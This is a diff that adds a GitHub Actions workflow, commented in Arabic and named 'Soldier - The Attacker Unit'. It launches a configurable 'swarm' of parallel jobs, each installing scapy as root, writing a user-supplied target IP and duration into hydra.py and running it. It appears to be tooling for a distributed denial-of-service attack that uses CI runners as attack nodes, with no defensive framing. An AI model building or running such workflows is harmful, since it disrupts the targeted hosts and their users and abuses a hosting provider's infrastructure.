@@ -1,0 +1,44 @@
+# اسم الـ Workflow: Soldier - The Attacker Unit
+name: Soldier Unit
+
+on:
+  # هذا الـ workflow لا يمكن تشغيله إلا بواسطة workflow آخر
+  workflow_dispatch:
+    inputs:
+      target_ip:
+        description: 'IP الهدف'
+        required: true
+      duration:
+        description: 'مدة الهجوم'
+        required: true
+      swarm_size:
+        description: 'حجم السرب'
+        required: true
+
+jobs:
+  attack_soldier:
+    runs-on: ubuntu-latest
+    strategy:
+      fail-fast: false
+      # إنشاء مصفوفة الجنود داخل الدفعة الواحدة
+      matrix:
+        soldier_id: ${{ fromJson(format('[{0}]', join(range(1, github.event.inputs.swarm_size + 1), ','))) }}
+    
+    steps:
+      - uses: actions/checkout@v3
+      - uses: actions/setup-python@v3
+        with:
+          python-version: 3.9
+
+      - name: Install dependencies for ROOT
+        run: |
+          sudo python3 -m pip install --upgrade pip
+          sudo pip3 install scapy aiodns
+
+      - name: Launch Hydra - Soldier ${{ matrix.soldier_id }}
+        timeout-minutes: ${{ fromJson(format('{0}', (github.event.inputs.duration / 60) + 5)) }}
+        run: |
+          sed -i "s/TARGET_IP = .*/TARGET_IP = \"${{ github.event.inputs.target_ip }}\"/" hydra.py
+          sed -i "s/DURATION = .*/DURATION = ${{ github.event.inputs.duration }}/" hydra.py
+          echo "الجندي ${{ matrix.soldier_id }} من الدفعة الحالية يبدأ الهجوم..."
+          sudo python3 hydra.py
